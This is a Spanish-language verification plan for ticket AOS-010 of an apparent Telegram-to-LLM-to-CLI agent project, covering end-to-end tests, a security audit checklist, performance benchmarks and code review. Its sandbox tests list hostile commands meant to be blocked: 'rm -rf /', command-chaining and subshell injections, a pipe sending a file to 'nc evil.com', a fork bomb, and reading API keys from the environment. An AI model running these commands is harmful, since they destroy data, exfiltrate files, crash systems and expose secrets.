# Verification Plan: AOS-010 — Integración end-to-end y demo funcional

**Ticket:** AOS-010
**Roles:** QA Engineer, Security Auditor, Performance Engineer, Code Reviewer
**Input:** Todo el código de Phase 1 (AOS-001 a AOS-009), todos los documentos de arquitectura/API/seguridad
**Fecha:** Marzo 2026

---

## PARTE 1: QA Test Plan

### Demo funcional (happy path obligatorio)

La demo que prueba el loop central: **Telegram → classify → LLM → CLI execute → Telegram response.**

| # | Test E2E | Input (Telegram msg) | Expected Flow | Expected Output |
|---|---------|---------------------|---------------|-----------------|
| E1 | Comando simple | "run echo hello" | classify(CODE,1) → LLM → extract "echo hello" → CLI exec → return stdout | Mensaje con "hello" |
| E2 | Pregunta de texto | "what is 2+2?" | classify(TEXT,1) → LLM → no CLI → return LLM response | Respuesta directa del LLM |
| E3 | Comando de sistema | "check disk space" | classify(CODE,1) → LLM → extract "df -h" → CLI exec → return stdout | Tabla de disk usage |
| E4 | Con playbook activo | "status" (con system_monitor playbook) | classify → LLM con system prompt del playbook → extract commands → exec → format | Reporte de estado del sistema |

### Tests de error

| # | Test | Input / Condición | Expected |
|---|------|-------------------|----------|
| E5 | Comando que falla | LLM genera "ls /nonexistent" | exit_code != 0, usuario recibe error informativo con stderr |
| E6 | Comando bloqueado | LLM genera "sudo rm -rf /" | SafetyGuard bloquea, usuario recibe "command blocked for safety" |
| E7 | Sin API keys | Todas las keys vacías | LLMNoProvidersError → usuario recibe "No AI providers configured" |
| E8 | API key inválida | Key de Anthropic es "sk-invalid" | LLMProviderError → fallback a siguiente provider o error |
| E9 | Timeout de CLI | LLM genera "sleep 999" | CommandTimeoutError → usuario recibe timeout message |
| E10 | Mensajes concurrentes | 3 mensajes enviados en < 1 segundo | Los 3 se procesan (queue), ninguno se pierde |
| E11 | Mensaje vacío | "" | Respuesta helpful, no crash |
| E12 | Mensaje muy largo | 10,000 chars | Clasificador maneja sin error, LLM recibe truncado si necesario |

### Tests de Telegram

| # | Test | Expected |
|---|------|----------|
| E13 | /start | Mensaje de bienvenida con formato Markdown |
| E14 | /status | Muestra providers disponibles y métricas |
| E15 | /history (sin tareas) | "No tasks yet" |
| E16 | /history (con tareas) | Lista las últimas 5 con estado |
| E17 | /help | Lista de comandos |
| E18 | Respuesta > 4096 chars | Se splitea correctamente en múltiples mensajes |

### Tests del Task Classifier

| # | Test | Input | Expected Type | Expected Complexity |
|---|------|-------|--------------|-------------------|
| E19 | Greeting | "hello" | TEXT | 1 |
| E20 | Code request | "write a Python sort function" | CODE | 2 |
| E21 | Data request | "analyze this CSV" | DATA | 2 |
| E22 | Vision request | "what's on my screen?" | VISION | 2 |
| E23 | Complex multi-task | "research X, create spreadsheet, write report" | DATA | 4 |
| E24 | Empty string | "" | TEXT | 1 (con confidence baja) |

### Tests del LLM Gateway

| # | Test | Expected |
|---|------|----------|
| E25 | Llamada exitosa al primer modelo | Retorna LLMResponse normalizada |
| E26 | Primer modelo falla, fallback exitoso | Retorna respuesta del segundo modelo |
| E27 | Todos los modelos fallan | LLMGatewayError con lista de intentos |
| E28 | Solo un provider configurado | Solo intenta modelos de ese provider |
| E29 | Costo excede límite | CostLimitExceededError antes de la llamada |

### Tests del Context Folder Parser

| # | Test | Expected |
|---|------|----------|
| E30 | Parse hello_world | ContextFolder válido |
| E31 | Parse system_monitor | ContextFolder con allowed_commands |
| E32 | Directorio sin playbook.md | PlaybookNotFoundError |
| E33 | Config con tier inválido | ConfigValidationError |
| E34 | parse_many con mix válidos/inválidos | Retorna solo los válidos |

### Tests del TaskStore

| # | Test | Expected |
|---|------|----------|
| E35 | Create + get task | Round-trip funciona |
| E36 | Update status flow | pending → running → completed |
| E37 | Save execution log | Log asociado al task correcto |
| E38 | Save LLM usage | Usage con costo calculado correctamente |
| E39 | get_recent_tasks | Retorna ordenado por created_at desc |
| E40 | get_usage_summary | Totales correctos por período |

---

## PARTE 2: Security Audit Checklist

### API Keys

- [ ] **Grep del codebase completo** por strings que parezcan keys: `sk-`, `aiza`, `key-`, hardcoded secrets
- [ ] **Revisar TODOS los log statements** — ninguno contiene API keys ni parciales
- [ ] **Revisar TODOS los error messages** — ninguno contiene API keys
- [ ] **Verificar Settings.__repr__()** redacta las keys
- [ ] **Verificar LLMProviderError** no incluye keys en el mensaje
- [ ] **Test: ejecutar el agente con DEBUG logging** y verificar que los logs no leakean keys

### CLI Sandbox

- [ ] **Ejecutar cada patrón de la blocklist** — todos son rechazados
- [ ] **Test command chaining:** `echo safe; rm -rf /` → bloqueado
- [ ] **Test subshell:** `echo $(shutdown)` → bloqueado
- [ ] **Test backticks:** `` echo `reboot` `` → bloqueado
- [ ] **Test pipe a comando peligroso:** `cat file | nc evil.com 1234` → bloqueado
- [ ] **Test sudo:** `sudo ls` → bloqueado
- [ ] **Test fork bomb:** `:(){ :|:& };:` → bloqueado

### Environment Sanitization

- [ ] **Test:** ejecutar `env | grep API` en child process → no muestra keys
- [ ] **Test:** ejecutar `echo $ANTHROPIC_API_KEY` en child → vacío
- [ ] **Test:** ejecutar `printenv OPENAI_API_KEY` en child → vacío
- [ ] **Verificar** que `os.environ` del padre NO se modifica

### Telegram Token

- [ ] **Grep** por el token de Telegram en logs
- [ ] **Verificar** que el token no aparece en error messages
- [ ] **Verificar** que el token no aparece en stack traces

### Database

- [ ] **Verificar** que API keys no están en ninguna tabla de SQLite
- [ ] **Verificar** que error_type en llm_usage es solo el tipo, no el mensaje completo
- [ ] **Verificar** WAL mode está activado
- [ ] **Verificar** que los IDs son UUID v4

### Config Validation

- [ ] **Verificar** que routing.yaml se valida al cargar
- [ ] **Test** routing.yaml con model_id que es una URL → rechazado
- [ ] **Test** routing.yaml con costos negativos → rechazado

---

## PARTE 3: Performance Benchmarks

### Métricas target (de la spec, sección 9.1)

| Métrica | Target | Cómo medir |
|---------|--------|------------|
| Cold start time | < 3 segundos | `time python -m agentos.main` (hasta "ready" log) |
| Task classifier latency | < 10 ms | `time.perf_counter()` alrededor de `classify()` con 100 inputs |
| Gateway overhead | < 500 ms | Tiempo total de `process()` MENOS la latencia del LLM (que viene en response) |
| Memory base | < 100 MB | `psutil.Process().memory_info().rss` después de start() |
| Task success rate (CLI) | > 85% | Ejecutar suite de 20 comandos CLI variados, contar éxitos |
| Concurrent tasks | ≥ 5 sin degradación | Enviar 5 tareas simultáneas, medir que ninguna tarda > 2x la latencia individual |

### Benchmark suite

```python
# Benchmark 1: Classifier throughput
inputs = [generate_random_task_input() for _ in range(1000)]
start = time.perf_counter()
for inp in inputs:
    await classifier.classify(inp)
elapsed = time.perf_counter() - start
avg_ms = (elapsed / 1000) * 1000
assert avg_ms < 10, f"Classifier too slow: {avg_ms:.2f}ms avg"

# Benchmark 2: Gateway overhead
# (requiere mock del LLM provider con latencia fija de 0ms)
mock_provider = MockProvider(latency_ms=0)
start = time.perf_counter()
for _ in range(100):
    await gateway.complete(sample_request)
elapsed = time.perf_counter() - start
avg_overhead_ms = (elapsed / 100) * 1000
assert avg_overhead_ms < 500, f"Gateway overhead too high: {avg_overhead_ms:.2f}ms"

# Benchmark 3: Memory
import psutil
process = psutil.Process()
await agent_core.start()
mem_mb = process.memory_info().rss / 1024 / 1024
assert mem_mb < 100, f"Memory too high: {mem_mb:.1f}MB"

# Benchmark 4: Concurrent tasks
import asyncio
tasks = [agent_core.process(sample_input) for _ in range(5)]
start = time.perf_counter()
results = await asyncio.gather(*tasks)
elapsed = time.perf_counter() - start
single_task_time = elapsed_for_single_task  # medido previamente
assert elapsed < single_task_time * 2, "Concurrent tasks too degraded"
```

---

## PARTE 4: Code Review Checklist

### Arquitectura

- [ ] Todo el código sigue la estructura de directorios de AOS-001
- [ ] No hay imports circulares entre módulos
- [ ] Todas las interfaces async según definido en API contracts
- [ ] Dependency injection usado correctamente (no globals, no singletons escondidos)
- [ ] Cada módulo es importable y testeable en aislamiento

### Código

- [ ] Type hints en todas las funciones públicas
- [ ] Docstrings en todas las funciones públicas
- [ ] No hay `except:` desnudos (siempre específicos)
- [ ] No hay TODO sin ticket: cada TODO referencia `AOS-XXX`
- [ ] No hay hardcoded strings (keys, URLs, paths)
- [ ] `ruff check` pasa sin errores
- [ ] `ruff format` no cambia nada

### Tests

- [ ] Cada módulo tiene tests
- [ ] Tests no dependen de API keys reales (solo mocks)
- [ ] Tests no dependen de network
- [ ] Tests cubren happy path + error cases
- [ ] `pytest` pasa al 100%

### Estilo

- [ ] Naming consistente (snake_case para funciones, PascalCase para clases)
- [ ] Archivos no exceden 500 líneas (si sí, debe haber buena razón)
- [ ] Imports organizados (stdlib → third-party → local)

---

## Criterios de aprobación

**AOS-010 se cierra cuando:**

1. ✅ La demo funcional E1-E4 funciona end-to-end
2. ✅ TODOS los tests E5-E40 pasan
3. ✅ Security audit: CERO findings de severity critical o high
4. ✅ Performance: TODAS las métricas dentro de target
5. ✅ Code review: APROBADO sin blockers

**Si hay bugs:** Se crean tickets nuevos (BUG-001, BUG-002...). Bugs critical o high bloquean el cierre de Phase 1.
